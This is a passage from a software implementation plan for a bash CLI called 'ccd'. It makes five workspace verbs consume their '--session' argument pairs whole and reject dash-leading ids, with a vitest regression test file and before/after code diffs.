    - the id check line `… || _lc_refuse restore "$id" bad-session-id "bad session id"`.
  - Then restamp.
- Modify `server/test/ccd-actor-flags.test.ts`: in the case `does NOT strip --reason: the hold reason is still positional and still mandatory`, the 12-line comment that begins `// Fix round 1 on this task's review: the brief's own sample call here` is rewritten, 12 lines to 12. The assertion is unchanged, and so is every other line.
- Create the test `server/test/ccd-session-verbs-dash-id.test.ts`.
- Not edited: `session-hook.test.ts`, `ccd-refusal-scan.test.ts`, `wsaudit.test.ts`, `ccd-wsaudit-nonpoison.test.ts`, `ccdargv-dec-parity.test.ts`, and every other existing test (HARD BOUNDARY).
- Not reworded: ws-restore's WAVE 5 header. It has no sentence saying a flag left in argv is refused.

**Interfaces:**
- Consumes:
  - `_reg_id_ok WORD` (Task 1; `ccd/ccd`, directly above `# THE ID A WITNESS MAY BE NAMED FOR`). It returns rc 0 iff WORD matches `^[A-Za-z0-9._-]+$` under `LC_ALL=C` and does not begin with `-`.
  - From `server/test/dashIdFixture.ts` (Task 1):
    - `DECOY_IDS` (`readonly ['agent', 'pwa']`) and `type DashId`;
    - `plantRow(home: string, id: string, fields?: Readonly<Record<string, string>>): void`;
    - `reapLocks(home: string): string[]`;
    - `regListing(home: string): string[]`.
  - `makeCcdHarness(prefix: string): CcdHarness` and `type CcdHarness` (`server/test/ccdWsHelpers.ts`), using `h.sh`, `h.reg`, `h.home` and `h.cleanup`.
  - `readJournal`, `eventsOf`, `refusalsOf` and `decOf` (`server/test/lifecycleHelpers.ts`).
- Produces (`ccd/ccd`; the exact text is in §Interfaces):
  - the arms:
    ```bash
          --session)   if (( $# >= 2 )); then lc_args+=("$1" "$2"); shift 2; else lc_args+=("$1"); shift; fi ;;            # ws-release, ws-archive, ws-restore
          --session|--reason) if (( $# >= 2 )); then lc_args+=("$1" "$2"); shift 2; else lc_args+=("$1"); shift; fi ;;     # ws-hold
          --session|--branch) if (( $# >= 2 )); then lc_args+=("$1" "$2"); shift 2; else lc_args+=("$1"); shift; fi ;;     # ws-rename
    ```
  - the post-loop checks:
    - ws-release, ws-archive and ws-hold: `_reg_id_ok "$id" || die "bad session id"`;
    - ws-restore: `_reg_id_ok "$id" || _lc_refuse restore "$id" bad-session-id "bad session id"`;
    - ws-rename: `if ! _reg_id_ok "$id"; then`.

- [ ] **Step 0: Entry conditions (Tasks 1 to 3 are committed; measure, never assume)**

Run from the workspace root:

```bash
grep -c '^_reg_id_ok() { local LC_ALL=C;' ccd/ccd                                   # (a) 1: Task 1's helper
grep -n '^# THE ID A VERB MAY BIND' ccd/ccd                                          # (b) one line: Task 1's comment, above `# THE ID A WITNESS MAY BE NAMED FOR`
grep -cE '^export (const DECOY_IDS|type DashId|function plantRow|function reapLocks|function regListing)\b' server/test/dashIdFixture.ts   # (c) 5
grep -n '^cmd_ws_rename()\|^cmd_ws_hold()\|^cmd_ws_release()\|^cmd_ws_archive()\|^cmd_ws_restore()' ccd/ccd   # (d) hints 8023 8695 8820 9741 10197
grep -nE '^ +\*\) +lc_args\+=\("\$1"\); shift ;;$' ccd/ccd | wc -l                    # (e) 6: no identity arm in these loops yet
grep -cE 'lc_args\+=\("\$1" "\$2"\)' ccd/ccd                                         # (f) 0
grep -cE '\[\[ \$id =~ \^\[A-Za-z0-9\._-\]\+\$ \]\]' ccd/ccd                         # (g) 10: Task 2 removed three of Task 0's 13
grep -cE '\[\[ ! \$id =~' ccd/ccd                                                    # (h) 1: ws-rename's
awk '/^cmd_stop\(\) \{/{f=1} f&&/FLAGS ARE STRIPPED BEFORE THE ARITY RULE/{print NR; exit}' ccd/ccd   # (i) one line: Task 3 kept the phrase the two headers tell readers to grep
grep -c 'FIX ROUND 3 (operator escalation' ccd/ccd                                   # (j) 1: ws-restore's
git status --porcelain -- ccd/ccd server/test                                        # (k) empty: Task 3 is committed
```

- If (a), (b), (c) or (i) prints anything else, an earlier task is missing: **STOP** and report the check by its label.
- If (e), (f), (g) or (h) differs, report the measured value by label and STOP. A count is not a line number, and it says what this task's edits leave behind.

- [ ] **Step 1: Write the failing tests**

Create `server/test/ccd-session-verbs-dash-id.test.ts`:

```ts
// server/test/ccd-session-verbs-dash-id.test.ts
//
// PATH-IDENTITY W1b, TASK 4 (path-identity spec §2.2, §2.4). ws-release, ws-archive, ws-restore, ws-hold and
// ws-rename take their identity pairs WHOLE. Before this task none of the five loops had a `--session` arm: the key and
// its value fell into the residue one token at a time, so the value was scanned again as a flag, and the server's
// `ws-release --session --actor --surface agent --actor sweep` bound the id `agent`, the sweeps' surface word. Each
// loop now has one identity arm, first in its `case`, that appends the key and its value to the residue together, or
// the lone key when no value follows, so each verb's exact-arity rule still refuses a duplicate, a wrong order and a
// lone key with today's words. Each post-loop id check is `_reg_id_ok`, which refuses a leading `-`.
//
// THE FIXTURES. Every ccd call goes through `h.sh` (through `run` below), so this file spawns no bash of its own and
// `ccd-workspaces.test.ts`'s containment scan holds nothing against it. A row whose id spells a flag is planted with
// node:fs (`plantRow`), never through ccd, which cannot mint one. The decoys `agent` and `pwa` are the surface words a
// redirect lands on. Each holds a workspace and a hold, so a redirected release, archive or hold shows on disk, and a
// redirected restore shows as a journal line or a reap lock that names it.
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { mkdirSync } from 'node:fs';
import path from 'node:path';
import { makeCcdHarness, type CcdHarness } from './ccdWsHelpers.js';
import { decOf, eventsOf, readJournal, refusalsOf } from './lifecycleHelpers.js';
import { DECOY_IDS, plantRow, reapLocks, regListing, type DashId } from './dashIdFixture.js';

let h: CcdHarness;

interface Ran { readonly code: number; readonly stdout: string; readonly stderr: string }
/** `h.sh` throws on a non-zero exit; this answers the exit code and both streams instead. */
const run = (snippet: string): Ran => {
  try { return { code: 0, stdout: h.sh(snippet), stderr: '' }; }
  catch (e) {
    const err = e as { status?: number; stdout?: string | Buffer; stderr?: string | Buffer };
    return { code: err.status ?? 1, stdout: String(err.stdout ?? ''), stderr: String(err.stderr ?? '') };
  }
};
/** One JSON answer, or the raw text when it is not one, so a mutant's prose reds the comparison instead of throwing. */
const docOf = (stdout: string): unknown => {
  try { return JSON.parse(stdout.trim()) as unknown; } catch { return stdout; }
};

// The stubs, each copied from `ccd-actor-flags.test.ts`'s constant of the same name: every irreversible step a verb
// would reach if a mutant let it past the id check is stubbed, and tmux is stubbed for the journal's `_lc_obs`.
const REL_STUBS = 'tmux() { return 1; };';
const HOLD_STUBS = 'tmux() { return 1; };';
const ARCHIVE_STUBS = `tmux() { return 1; }; _ws_unsupervise() { :; };
  _ws_idle_ok() { return 0; }; _ws_status() { echo idle; }; _ws_archive_manifest() { echo '{}'; };`;
const RESTORE_STUBS = `tmux() { return 1; }; flock() { return 0; };
  _ws_supervise() { :; }; _spawn() { :; };`;
const RENAME_STUBS = `tmux() { return 1; }; _ws_branch_valid() { return 0; };
    _ws_wt_branch() { echo ws/quiet-basin; return 0; };`;

const REAL = 'demo-quiet-basin';
const DECOY_HOLD = 'program:decoy wave:1/1';
const PLANTED_HOLD = 'program:planted wave:1/1';
const HOLD_REASON = 'program:x wave:1/4';
/** The ids whose flag spelling a decision-flag arm eats, which is what made the surface word the id. */
const REDIRECT_IDS: readonly DashId[] = ['--actor', '--surface', '--reason'];

/** The server's decision tail (`decFlags` in `server/src/ccdargv.ts`), typed here because this file imports nothing
 *  from `server/src`: `--surface <s> --actor <a>`, then `--reason <r>` when the decision carries one. */
const decTail = (surface: string, withReason: boolean): string =>
  `--surface ${surface} --actor 'probe:dash id'${withReason ? " --reason 'probe reason'" : ''}`;
/** Each decoy word as the declared surface, with and without a reason. */
const DECS: readonly { readonly surface: string; readonly reason: boolean }[] =
  DECOY_IDS.flatMap((surface) => [{ surface, reason: false }, { surface, reason: true }]);

/** A workspace row complete enough to reach each verb's body (the shape of `ccd-actor-flags.test.ts`'s
 *  `seedWorkspace`, its directory on disk included), planted with node:fs so that its id may spell a flag. */
const plantWorkspace = (id: string, hold: string | null): void => {
  const slug = id.replace(/^-+/, 'dash-');
  const workdir = path.join(h.home, 'worktrees', 'demo', slug);
  mkdirSync(workdir, { recursive: true });
  plantRow(h.home, id, {
    project: 'demo', workspace: slug, workdir, branch: `ws/${slug}`, wrapper: 'claude',
    ...(hold === null ? {} : { hold }),
  });
};

/** No decoy lost its hold or gained an archive stamp, and no journal line names one. */
const expectDecoysUntouched = (): void => {
  for (const d of DECOY_IDS) {
    expect.soft(h.reg(d, 'hold'), `${d}'s hold`).toBe(DECOY_HOLD);
    expect.soft(h.reg(d, 'archived'), `${d} was archived`).toBeNull();
  }
  expect(readJournal(h.home).filter((e) => (DECOY_IDS as readonly string[]).includes(String(e['id']))),
    'a journal line names a decoy').toEqual([]);
};

beforeEach(() => {
  h = makeCcdHarness('ccrc-ccd-sessdash-');
  for (const d of DECOY_IDS) plantWorkspace(d, DECOY_HOLD);
  plantWorkspace('--actor', PLANTED_HOLD);
  plantWorkspace('--reason', null);
  plantWorkspace('--branch', null);
});
afterEach(() => { h.cleanup(); });

describe('ws-release binds its identity pair whole (path-identity spec §2.2, §2.4)', () => {
  it('ids --actor, --surface and --reason die "bad session id", and agent\'s hold stands', () => {
    for (const id of REDIRECT_IDS) {
      for (const d of DECS) {
        const tail = decTail(d.surface, d.reason);
        const r = run(`${REL_STUBS} cmd_ws_release --session '${id}' ${tail}`);
        expect.soft(r.code, `--session ${id} ${tail}`).toBe(1);
        expect.soft(r.stderr.trim(), `--session ${id} ${tail}`).toBe('ccd: bad session id');
      }
    }
    expectDecoysUntouched();
    expect(h.reg('--actor', 'hold'), 'the planted --actor row').toBe(PLANTED_HOLD);
    expect(eventsOf(h.home, 'release')).toEqual([]);
  });

  it('a planted dash-leading row is never acted on', () => {
    // `--actor.uuid` and its hold exist, so an id check that admitted a dash-leading id would release the planted row
    // instead of refusing: this is the case that reds when `_reg_id_ok` is not the check.
    const r = run(`${REL_STUBS} cmd_ws_release --session '--actor' ${decTail('agent', false)}`);
    expect(r.stdout).not.toContain('released --actor');
    expect(r.code).toBe(1);
    expect(r.stderr.trim()).toBe('ccd: bad session id');
    expect(h.reg('--actor', 'hold')).toBe(PLANTED_HOLD);
    expect(eventsOf(h.home, 'release')).toEqual([]);
  });
});

describe('ws-archive binds its identity pair whole (path-identity spec §2.2, §2.4)', () => {
  it('ids --actor, --surface and --reason die "bad session id", and agent\'s hold stands', () => {
    for (const id of REDIRECT_IDS) {
      for (const d of DECS) {
        const tail = decTail(d.surface, d.reason);
        const r = run(`${ARCHIVE_STUBS} cmd_ws_archive --session '${id}' ${tail}`);
        expect.soft(r.code, `--session ${id} ${tail}`).toBe(1);
        expect.soft(r.stderr.trim(), `--session ${id} ${tail}`).toBe('ccd: bad session id');
      }
    }
    expectDecoysUntouched();
    expect(h.reg('--actor', 'archived'), 'the planted --actor row was archived').toBeNull();
    expect(eventsOf(h.home, 'archive')).toEqual([]);
  });
});

describe('ws-restore binds its identity pair whole (path-identity spec §2.2, §2.4)', () => {
  it('ids --actor, --surface and --reason are refused bad-session-id through _lc_refuse, and no journal line names agent', () => {
    const asked: string[] = [];
    for (const id of REDIRECT_IDS) {
      for (const d of DECS) {
        const tail = decTail(d.surface, d.reason);
        const r = run(`${RESTORE_STUBS} cmd_ws_restore --session '${id}' ${tail}`);
        expect.soft(r.code, `--session ${id} ${tail}`).toBe(1);
        expect.soft(r.stderr.trim(), `--session ${id} ${tail}`).toBe('ccd: bad session id');
        asked.push(id);
      }
    }
    // Restore journals its refusal against the id it was asked about, as it did before this wave: every restore row
    // is a bad-session-id refusal naming the dash id, in the order asked, and none names a decoy.
    expect(refusalsOf(h.home)).toEqual(asked.map(() => ({ act: 'restore', token: 'bad-session-id' })));
    expect(eventsOf(h.home, 'restore').map((e) => String(e['id']))).toEqual(asked);
    expect(reapLocks(h.home), 'a reap lock was opened before the refusal').toEqual([]);
    expectDecoysUntouched();
  });
});

describe('ws-hold binds its identity pair whole (path-identity spec §2.2, §2.4)', () => {
  it('an id of --reason dies "bad session id", and the planted --reason row is not held', () => {
    for (const d of DECOY_IDS) {
      const snippet = `${HOLD_STUBS} cmd_ws_hold --session '--reason' --reason '${HOLD_REASON}' ${decTail(d, false)}`;
      const r = run(snippet);
      expect.soft(r.code, snippet).toBe(1);
      expect.soft(r.stderr.trim(), snippet).toBe('ccd: bad session id');
    }
    expect(h.reg('--reason', 'hold'), 'the planted --reason row was held').toBeNull();
    expect(eventsOf(h.home, 'hold')).toEqual([]);
    expectDecoysUntouched();
  });

  // EXTRA PIN. The --reason row above stays green when ws-hold's arm is deleted, because the residue is the same
  // either way and `_reg_id_ok` refuses the literal id. These ids are what the arm changes: without it they refuse on
  // arity, with the usage line; with it the pair reaches the id check.
  it('ids --actor and --surface die "bad session id" too, and no decoy is held anew', () => {
    for (const id of ['--actor', '--surface'] as const) {
      for (const d of DECOY_IDS) {
        const snippet = `${HOLD_STUBS} cmd_ws_hold --session '${id}' --reason '${HOLD_REASON}' ${decTail(d, false)}`;
        const r = run(snippet);
        expect.soft(r.code, snippet).toBe(1);
        expect.soft(r.stderr.trim(), snippet).toBe('ccd: bad session id');
      }
    }
    expect(h.reg('--actor', 'hold'), 'the planted --actor row').toBe(PLANTED_HOLD);
    expect(eventsOf(h.home, 'hold')).toEqual([]);
    expectDecoysUntouched();
  });

  // EXTRA PIN. The server composes `--session <id> --reason <reason>` and then its decision flags. A reason that
  // spells `--surface` used to be eaten as the surface value by the `--surface` arm, so the hold landed with the reason
  // `agent`. The `--reason` arm now keeps the pair whole.
  it('a hold reason the server spells as a flag is held verbatim, under the surface it declared', () => {
    plantWorkspace(REAL, null);
    const r = run(`${HOLD_STUBS} cmd_ws_hold --session ${REAL} --reason '--surface' ${decTail('agent', false)}`);
    expect(r.code, r.stderr).toBe(0);
    expect(r.stdout).toBe(`held ${REAL}: --surface`);
    expect(h.reg(REAL, 'hold')).toBe('--surface');
    expect(eventsOf(h.home, 'hold').map((e) => decOf(e)['surface'])).toEqual(['agent']);
  });
});

describe('ws-rename binds its identity pair whole (path-identity spec §2.2, §2.4)', () => {
  it('an id of --branch answers {"refused":"bad-args"} "bad session id: --branch" at exit 0, and the planted row is untouched', () => {
    const before = regListing(h.home);
    for (const d of DECS) {
      const tail = decTail(d.surface, d.reason);
      const r = run(`${RENAME_STUBS} cmd_ws_rename --session '--branch' --branch ws/renamed ${tail}`);
      expect.soft(r.code, tail).toBe(0);
      expect.soft(docOf(r.stdout), tail)
        .toEqual({ refused: 'bad-args', detail: 'bad session id: --branch', paths: [] });
    }
    expect(regListing(h.home)).toEqual(before);
    expect(h.reg('--branch', 'branch')).toBe('ws/dash-branch');
  });

  // EXTRA PIN, for ws-hold's reason: the --branch row stays green when ws-rename's arm is deleted. These ids are the
  // ones the arm changes, from the usage line to the id check's own answer.
  it('ids --actor, --surface and --reason answer "bad session id: <id>", never the usage line', () => {
    for (const id of REDIRECT_IDS) {
      const r = run(`${RENAME_STUBS} cmd_ws_rename --session '${id}' --branch ws/renamed ${decTail('agent', true)}`);
      expect.soft(r.code, id).toBe(0);
      expect.soft(docOf(r.stdout), id).toEqual({ refused: 'bad-args', detail: `bad session id: ${id}`, paths: [] });
    }
  });

  // EXTRA PIN, for the arm's `--branch` half: both cases above stay green when the arm is narrowed to `--session)`.
  // The naming sweep's branch name is derived from model output. A branch value that spells a flag used to lose to a
  // dec arm, and the surface word became the NEW name (`--branch --actor --surface agent …` asked for `agent`). Taken
  // whole, the value reaches `_ws_branch_valid`, stubbed here to refuse every name, so the detail shows which was asked.
  it('a --branch value spelled as a flag is taken whole, never replaced by the surface word', () => {
    plantWorkspace(REAL, null);
    for (const value of REDIRECT_IDS) {
      const r = run(`${RENAME_STUBS} _ws_branch_valid() { return 1; }; `
        + `cmd_ws_rename --session ${REAL} --branch '${value}' ${decTail('agent', true)}`);
      expect.soft(r.code, value).toBe(0);
      expect.soft(docOf(r.stdout), value)
        .toEqual({ refused: 'bad-branch', detail: `invalid branch name: ${value}`, paths: [] });
    }
    expect(h.reg(REAL, 'branch'), 'the branch field is untouched').toBe('ws/demo-quiet-basin');
  });
});

describe('the identity arms narrow nothing else (path-identity spec §2.4)', () => {
  it('prose may lead with a dash', () => {
    plantWorkspace(REAL, HOLD_REASON);
    const rel = run(`${REL_STUBS} cmd_ws_release --session ${REAL} --actor '-device' --reason '--tidy'`);
    expect(rel.code, rel.stderr).toBe(0);
    expect(rel.stdout).toBe(`released ${REAL}`);
    const dec = decOf(eventsOf(h.home, 'release')[0] ?? {});
    expect(dec['actor']).toBe('-device');
    expect(dec['reason']).toBe('--tidy');
    const held = run(`${HOLD_STUBS} cmd_ws_hold --session ${REAL} --reason '--program:x wave:1/4'`);
    expect(held.code, held.stderr).toBe(0);
    expect(held.stdout).toBe(`held ${REAL}: --program:x wave:1/4`);
    expect(h.reg(REAL, 'hold')).toBe('--program:x wave:1/4');
  });

  it("order and duplicates still refuse with today's words", () => {
    plantWorkspace(REAL, null);
    const USAGE_REL = 'ccd: usage: ccd ws-release --session <id>';
    const USAGE_HOLD = 'ccd: usage: ccd ws-hold --session <id> --reason <text>';
    const rows: readonly (readonly [string, string])[] = [
      [`${REL_STUBS} cmd_ws_release --session ${REAL} --session demo-quiet-other`, USAGE_REL],
      [`${REL_STUBS} cmd_ws_release --session`, USAGE_REL],
      [`${REL_STUBS} cmd_ws_release --surface pwa --session`, USAGE_REL],
      // The dec ladder still runs before arity: a blank --actor ahead of a lone trailing key names the actor.
      [`${REL_STUBS} cmd_ws_release --actor '' --session`, 'ccd: --actor must be non-blank'],
      [`${HOLD_STUBS} cmd_ws_hold --reason '${HOLD_REASON}' --session ${REAL}`, USAGE_HOLD],
      [`${HOLD_STUBS} cmd_ws_hold --session ${REAL} --reason a --reason b`, USAGE_HOLD],
      [`${HOLD_STUBS} cmd_ws_hold --session ${REAL} --reason`, USAGE_HOLD],
    ];
    for (const [snippet, said] of rows) {
      const r = run(snippet);
      expect.soft(r.code, snippet).toBe(1);
      expect.soft(r.stderr.trim(), snippet).toBe(said);
    }
    const ren = run(`${RENAME_STUBS} cmd_ws_rename --session ${REAL} --session demo-quiet-other --branch ws/renamed`);
    expect(ren.code).toBe(0);
    expect(docOf(ren.stdout))
      .toEqual({ refused: 'bad-args', detail: 'usage: ccd ws-rename --session <id> --branch <name>', paths: [] });
    expect(h.reg(REAL, 'hold')).toBeNull();
  });
});
```

- [ ] **Step 2: Run the tests and see them fail**

```bash
(cd server && ./node_modules/.bin/vitest run test/ccd-session-verbs-dash-id.test.ts)
```

Expected: 12 tests, **10 failed and 2 passed**. The two that pass are the narrowing describe's `prose may lead with a dash` and `order and duplicates still refuse with today's words`. Both are green today and are pinned against over-tightening. The red cases and why:

| Case | Today's answer |
|---|---|
| ws-release, ids | `released agent` at exit 0 (then `not held agent`), and `agent`'s hold is removed |
| ws-release, planted row | exit 0 (the id is `agent`) |
| ws-archive, ids | `archived agent …` at exit 0, and `agent.archived` is written |
| ws-restore, ids | `not-archived` journaled against `agent`, and `.reap-agent.lock` is created |
| ws-hold, `--reason` | `held --reason: program:x wave:1/4` |
| ws-hold, `--actor` and `--surface` | `ccd: usage: ccd ws-hold --session <id> --reason <text>` |
| ws-hold, reason `--surface` | `held demo-quiet-basin: agent` |
| ws-rename, `--branch` | a later refusal, not `bad session id: --branch` |
| ws-rename, `--actor`, `--surface` and `--reason` | the usage detail |
| ws-rename, a `--branch` value spelled as a flag | `invalid branch name: agent`: the surface word was asked for as the new name |

A case that fails for any other reason (an import, a missing fixture export, a harness error) is a defect in Step 1 or in an earlier task. Fix it, or STOP and report it by slug. Do not go on.

- [ ] **Step 3: ws-rename (line-neutral; R9's ws-rename exception)**

In `cmd_ws_rename`, fold the WAVE 5 paragraph's first part from 12 lines to 11. The new text also says the identity pairs are consumed whole.

Before:
```bash
  # WAVE 5 — THE DEC FLAGS, STRIPPED HERE AND NOT ONE LINE EARLIER. Below the
  # `_json_str` probe, because every refusal in this verb is a QUOTED JSON
  # answer at exit 0 and an unquotable detail is a parse error rather than the
  # refusal it actually was. Above the arity rule, because the rule is exact
  # and a flag left in argv would refuse a correct call. A THIRD ARRANGEMENT
  # from Tasks 45-47's two: `cmd_ws_archive` (Task 45) binds no `id` until
  # AFTER its arity check, so its block could go almost anywhere above that
  # check; `cmd_ws_restore` (Task 46) binds `id="${2-}"` as its very first
  # statement, so its block had to precede that binding specifically. This verb
  # binds neither `id` nor `new` until AFTER the arity check below (`local
  # id=$2 new=$4`, ccd:4022 pre-wave-5) — so, unlike Task 46's case, there is no
  # earlier binding this placement could land on the wrong side of.
```
After:
```bash
  # WAVE 5 — THE DEC FLAGS, STRIPPED HERE AND NOT ONE LINE EARLIER. Below the
  # `_json_str` probe, because every refusal in this verb is a QUOTED JSON
  # answer at exit 0 and an unquotable detail is a parse error rather than the
  # refusal it actually was. Above the arity rule, because the rule is exact; the
  # `--session` and `--branch` pairs are consumed WHOLE and kept in the residue
  # for it, so neither value is scanned as a flag (path-identity spec §2.4). A
  # THIRD ARRANGEMENT beside two other wave-5 verbs': `cmd_ws_archive` binds no
  # `id` until AFTER its arity check; `cmd_ws_restore` binds `id="${2-}"` as its
  # very first statement, so its block had to precede that binding. This verb
  # binds neither `id` nor `new` until AFTER the arity check below (`local id=$2
  # new=$4`), so there is no earlier binding this placement could land on.
```

Add the arm first in the loop's `case`. This takes back the folded line, so `--surface)` and everything after it stay on their lines.

Before:
```bash
    case "$1" in
      --surface)   if [[ $# -ge 2 ]]; then lc_gs=1; lc_surface="$2"; shift 2
```
After:
```bash
    case "$1" in
      --session|--branch) if (( $# >= 2 )); then lc_args+=("$1" "$2"); shift 2; else lc_args+=("$1"); shift; fi ;;
      --surface)   if [[ $# -ge 2 ]]; then lc_gs=1; lc_surface="$2"; shift 2
```

Replace the post-loop id check in place.

Before:
```bash
  local id=$2 new=$4
  if [[ ! $id =~ ^[A-Za-z0-9._-]+$ ]]; then
```
After:
```bash
  local id=$2 new=$4
  if ! _reg_id_ok "$id"; then
```

- [ ] **Step 4: ws-hold (line-neutral)**

Reword the "TWO FLAGS, NOT THREE" note in place, 5 lines to 5. Its first two lines (`# WAVE 5 — TWO FLAGS, NOT THREE, …` and `# verb is already the HOLD's reason: …`) are unchanged.

Before:
```bash
  # display on every ccrc surface. Stripping it here would leave the residue at
  # arity 2, refuse every correct call, and make the workspace unholdable; and
  # accepting a SECOND `--reason` would put two different reasons on one verb
  # with nothing to say which one a reader is looking at. Spec D2's `dec.reason`
  # is therefore this same string — one reason, one meaning.
```
After:
```bash
  # display on every ccrc surface. Its arm consumes it as the positional PAIR,
  # kept in the residue for the arity rule and never read as a decision reason,
  # as `--session`'s arm keeps the id (path-identity spec §2.4): neither value
  # is scanned as a flag, and a SECOND `--reason` still refuses on arity. Spec
  # D2's `dec.reason` is therefore this same string — one reason, one meaning.
```

Add the arm, and fold the arity comment from 3 lines to 2.

Before:
```bash
    case "$1" in
      # An explicit arity check, not a bare `shift 2`: ccd runs under
      # `set -uo pipefail` with NO `-e`, so a shift past the end of argv fails,
      # shifts nothing, and this loop never terminates.
      --surface)   [[ $# -ge 2 ]] || die "usage: ccd ws-hold [--surface <word>] [--actor <text>] --session <id> --reason <text>"
```
After:
```bash
    case "$1" in
      --session|--reason) if (( $# >= 2 )); then lc_args+=("$1" "$2"); shift 2; else lc_args+=("$1"); shift; fi ;;
      # An explicit arity check, not a bare `shift 2`: ccd runs `set -uo pipefail` with NO
      # `-e`, so a shift past the end of argv fails, shifts nothing, and the loop never ends.
      --surface)   [[ $# -ge 2 ]] || die "usage: ccd ws-hold [--surface <word>] [--actor <text>] --session <id> --reason <text>"
```

Replace the post-loop id check.

Before:
```bash
  local lc_reason=$reason
  [[ $id =~ ^[A-Za-z0-9._-]+$ ]] || die "bad session id"
```
After:
```bash
  local lc_reason=$reason
  _reg_id_ok "$id" || die "bad session id"
```

- [ ] **Step 5: ws-release (line-neutral)**

Reword the last four lines of the WAVE 5 header in place, 4 to 4. Its first three lines, which keep `grep \`FLAGS ARE STRIPPED BEFORE THE ARITY RULE\``, are unchanged.

Before:
```bash
  # guard is EXACT arity on `--session <id>`, so a flag left in argv is not a
  # wider call, it is a REFUSED one — `ccd ws-release --session x --surface pwa`
  # would die in the usage check while the server reads the non-zero as "the
  # release failed on the box".
```
After:
```bash
  # guard is EXACT arity on `--session <id>`, and the `--session` pair is
  # consumed WHOLE and kept in the residue for that rule, so its value is never
  # scanned as a flag: an id spelled `--actor` stays the id, and `_reg_id_ok`
  # refuses it rather than binding the surface word (path-identity spec §2.4).
```

Add the arm, and fold the arity comment from 4 lines to 3.

Before:
```bash
    case "$1" in
      # An explicit arity check, not a bare `shift 2`: ccd runs under
      # `set -uo pipefail` with NO `-e`, so a shift past the end of argv fails,
      # shifts nothing, and this loop never terminates (`cmd_stop` carries the
      # same three lines over the same hazard).
      --surface)   [[ $# -ge 2 ]] || die "usage: ccd ws-release [--surface <word>] [--actor <text>] [--reason <text>] --session <id>"
```
After:
```bash
    case "$1" in
      --session)   if (( $# >= 2 )); then lc_args+=("$1" "$2"); shift 2; else lc_args+=("$1"); shift; fi ;;
      # An explicit arity check, not a bare `shift 2`: ccd runs `set -uo pipefail`
      # with NO `-e`, so a shift past the end of argv fails, shifts nothing, and this
      # loop never terminates (`cmd_stop` carries the same lines over the same hazard).
      --surface)   [[ $# -ge 2 ]] || die "usage: ccd ws-release [--surface <word>] [--actor <text>] [--reason <text>] --session <id>"
```

Replace the post-loop id check.

Before:
```bash
  [[ $# -eq 2 && $1 == --session ]] || die "usage: ccd ws-release --session <id>"
  local id=$2
  [[ $id =~ ^[A-Za-z0-9._-]+$ ]] || die "bad session id"
```
After:
```bash
  [[ $# -eq 2 && $1 == --session ]] || die "usage: ccd ws-release --session <id>"
  local id=$2
  _reg_id_ok "$id" || die "bad session id"
```

- [ ] **Step 6: ws-archive (line-neutral)**

Reword the last four lines of the WAVE 5 header in place, 4 to 4.

Before:
```bash
  # guard is EXACT arity on `--session <id>`, so a flag left in argv is not a
  # wider call, it is a REFUSED one — `ccd ws-archive --session x --surface pwa`
  # would die in the usage check while the server reads the non-zero as "the
  # archive failed on the box".
```
After:
```bash
  # guard is EXACT arity on `--session <id>`, and the `--session` pair is
  # consumed WHOLE and kept in the residue for that rule, so its value is never
  # scanned as a flag: an id spelled `--actor` stays the id, and `_reg_id_ok`
  # refuses it rather than binding the surface word (path-identity spec §2.4).
```

Add the arm, and fold the arity comment from 4 lines to 3.

Before:
```bash
    case "$1" in
      # An explicit arity check, not a bare `shift 2`: ccd runs under
      # `set -uo pipefail` with NO `-e`, so a shift past the end of argv fails,
      # shifts nothing, and this loop never terminates (`cmd_stop` carries the
      # same three lines over the same hazard).
      --surface)   [[ $# -ge 2 ]] || die "usage: ccd ws-archive [--surface <word>] [--actor <text>] [--reason <text>] --session <id>"
```
After:
```bash
    case "$1" in
      --session)   if (( $# >= 2 )); then lc_args+=("$1" "$2"); shift 2; else lc_args+=("$1"); shift; fi ;;
      # An explicit arity check, not a bare `shift 2`: ccd runs `set -uo pipefail`
      # with NO `-e`, so a shift past the end of argv fails, shifts nothing, and this
      # loop never terminates (`cmd_stop` carries the same lines over the same hazard).
      --surface)   [[ $# -ge 2 ]] || die "usage: ccd ws-archive [--surface <word>] [--actor <text>] [--reason <text>] --session <id>"
```

Replace the post-loop id check.

Before:
```bash
  [[ $# -eq 2 && $1 == --session ]] || die "usage: ccd ws-archive --session <id>"
  local id=$2
  [[ $id =~ ^[A-Za-z0-9._-]+$ ]] || die "bad session id"
```
After:
```bash
  [[ $# -eq 2 && $1 == --session ]] || die "usage: ccd ws-archive --session <id>"
  local id=$2
  _reg_id_ok "$id" || die "bad session id"
```

- [ ] **Step 7: ws-restore (line-neutral)**

Add the arm first in the `case`. Leave the 3-line arity comment unchanged, and fold the FIX ROUND 3 comment from 12 lines to 11.

Before:
```bash
    case "$1" in
      # An explicit arity check, not a bare `shift 2`: ccd runs under
      # `set -uo pipefail` with NO `-e`, so a shift past the end of argv fails,
      # shifts nothing, and this loop never terminates.
      # FIX ROUND 3 (operator escalation on F1's residual) — these three
      # ARITY ("needs a value") refusals fire INSIDE the parsing loop, before
      # the post-loop ladder below has validated anything. `lc_actor`/
      # `lc_reason` can already hold an UNVALIDATED (blank or over-cap) value
      # from an EARLIER `--actor`/`--reason` occurrence when a LATER flag's
      # missing value triggers one of these — measured: `--actor <600B>
      # --reason` (no value) put the full 600-byte actor on this refusal,
      # unexamined, the same leak class F1 closed on the post-loop ladder,
      # one arm over. Each arm below now applies the identical non-blank-
      # and-within-cap test the post-loop ladder uses before adding
      # `dec.actor`/`dec.reason` — a field that is not GIVEN is already ''
      # here (blank, so excluded the same way) and needs no separate case.
      --surface)   if [[ $# -lt 2 ]]; then
```
After:
```bash
    case "$1" in
      --session)   if (( $# >= 2 )); then lc_args+=("$1" "$2"); shift 2; else lc_args+=("$1"); shift; fi ;;
      # An explicit arity check, not a bare `shift 2`: ccd runs under
      # `set -uo pipefail` with NO `-e`, so a shift past the end of argv fails,
      # shifts nothing, and this loop never terminates.
      # FIX ROUND 3 (operator escalation on F1's residual) — the three ARITY
      # ("needs a value") refusals below fire INSIDE the parsing loop, before the
      # post-loop ladder has validated anything. `lc_actor`/`lc_reason` can
      # already hold an UNVALIDATED (blank or over-cap) value from an EARLIER
      # `--actor`/`--reason` occurrence when a LATER flag's missing value
      # triggers one — measured: `--actor <600B> --reason` (no value) put the
      # full 600-byte actor on this refusal, unexamined, the leak class F1 closed
      # on the post-loop ladder, one arm over. Each arm applies the post-loop
      # ladder's non-blank-and-within-cap test before adding `dec.actor`/
      # `dec.reason`; a field not GIVEN is already '' here (blank, excluded the
